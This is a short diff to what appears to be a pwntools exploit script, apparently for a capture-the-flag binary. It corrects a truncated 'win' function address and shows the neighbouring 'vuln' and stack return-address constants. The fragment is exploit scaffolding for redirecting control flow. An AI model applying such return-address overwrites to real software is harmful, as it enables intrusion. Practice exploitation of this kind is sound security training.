@@ -2,7 +2,7 @@
 # coding=utf-8
 from pwn import *
 
-win=0x080485
+win=0x080485cb
 vuln=0x80486ae
 
 ret=0xffffd5cc
